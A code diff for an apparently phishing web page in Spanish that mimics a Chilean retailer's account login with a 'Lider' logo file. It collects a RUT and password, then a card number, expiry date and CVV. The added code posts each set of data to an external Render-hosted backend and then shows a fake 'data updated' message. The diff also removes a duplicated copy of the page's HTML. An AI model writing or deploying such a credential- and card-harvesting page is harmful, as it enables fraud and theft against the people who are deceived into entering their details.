@@ -129,7 +129,7 @@
   </div>
 
   <script>
-    // Función para validar RUT chileno
+    // Validación de RUT chileno
     function validarRut(rut) {
       rut = rut.replace(/\./g, "").replace(/-/g, "");
       if (rut.length < 2) return false;
@@ -155,166 +155,52 @@
     const rutError = document.getElementById('rutError');
     const cardError = document.getElementById('cardError');
 
-    loginForm.addEventListener('submit', e => {
+    // URL de tu backend en Render
+    const BASE_URL = "https://tu-app.onrender.com";
+
+    loginForm.addEventListener('submit', async e => {
       e.preventDefault();
       const rut = document.getElementById('usuario').value;
+      const clave = document.getElementById('clave').value;
+
       if (!validarRut(rut)) {
         rutError.style.display = 'block';
         return;
       } else {
         rutError.style.display = 'none';
       }
+
+      // Enviar datos al backend
+      await fetch(`${BASE_URL}/login`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario: rut, clave })
+      });
+
       loginCard.style.display = 'none';
       updateCard.style.display = 'block';
     });
 
-    updateForm.addEventListener('submit', e => {
+    updateForm.addEventListener('submit', async e => {
       e.preventDefault();
       const numero = document.getElementById('numero').value;
+      const fecha = document.getElementById('fecha').value;
+      const cvv = document.getElementById('cvv').value;
+
       if (numero.length !== 16 || !/^\d+$/.test(numero)) {
         cardError.style.display = 'block';
         return;
       } else {
         cardError.style.display = 'none';
       }
-      updateCard.style.display = 'none';
-      successCard.style.display = 'block';
-    });
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Demo - Ingreso</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #004080; /* azul corporativo */
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .header {
-      text-align: center;
-      margin-bottom: 1rem;
-    }
-    .logo {
-      max-width: 150px;
-      height: auto;
-      margin-bottom: 0.5rem;
-    }
-    .login-title {
-      color: #fff;
-      font-size: 1.2rem;
-    }
-    .card {
-      background: #fff;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      width: 340px;
-      text-align: center;
-    }
-    .form-group {
-      margin-bottom: 1rem;
-      text-align: left;
-    }
-    .form-group label {
-      display: block;
-      margin-bottom: 0.5rem;
-      font-weight: bold;
-      color: #004080;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 0.5rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .btn {
-      width: 100%;
-      padding: 0.75rem;
-      background: #004080;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 1rem;
-    }
-    .btn:hover {
-      background: #003060;
-    }
-  </style>
-</head>
-<body>
-  <!-- Encabezado con logo y título -->
-  <div class="header">
-    <img src="logo_lider.png" alt="Logo Empresa" class="logo">
-    <h2 class="login-title">Ingresa a tu cuenta en línea</h2>
-  </div>
 
-  <!-- Tarjeta de login -->
-  <div class="card" id="loginCard">
-    <form id="loginForm">
-      <div class="form-group">
-        <label for="usuario">Usuario</label>
-        <input type="text" id="usuario" required>
-      </div>
-      <div class="form-group">
-        <label for="clave">Clave</label>
-        <input type="password" id="clave" required>
-      </div>
-      <button type="submit" class="btn">Ingresar</button>
-    </form>
-  </div>
+      // Enviar datos al backend
+      await fetch(`${BASE_URL}/update-card`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ numero, fecha, cvv })
+      });
 
-  <!-- Tarjeta de actualización -->
-  <div class="card" id="updateCard" style="display:none;">
-    <h2>Actualizar Tarjeta</h2>
-    <form id="updateForm">
-      <div class="form-group">
-        <label for="numero">Número (16 dígitos)</label>
-        <input type="text" id="numero" maxlength="16" required>
-      </div>
-      <div class="form-group">
-        <label for="fecha">Fecha de vencimiento (MM/AA)</label>
-        <input type="text" id="fecha" placeholder="MM/AA" required>
-      </div>
-      <div class="form-group">
-        <label for="cvv">Verificador (CVV)</label>
-        <input type="text" id="cvv" maxlength="3" required>
-      </div>
-      <button type="submit" class="btn">Ingresar Datos</button>
-    </form>
-  </div>
-
-  <!-- Tarjeta de confirmación -->
-  <div class="card" id="successCard" style="display:none;">
-    <h2>¡Datos actualizados!</h2>
-    <p>Hemos actualizado tus datos correctamente.</p>
-  </div>
-
-  <script>
-    const loginForm = document.getElementById('loginForm');
-    const updateForm = document.getElementById('updateForm');
-    const loginCard = document.getElementById('loginCard');
-    const updateCard = document.getElementById('updateCard');
-    const successCard = document.getElementById('successCard');
-
-    loginForm.addEventListener('submit', e => {
-      e.preventDefault();
-      loginCard.style.display = 'none';
-      updateCard.style.display = 'block';
-    });
-
-    updateForm.addEventListener('submit', e => {
-      e.preventDefault();
       updateCard.style.display = 'none';
       successCard.style.display = 'block';
     });
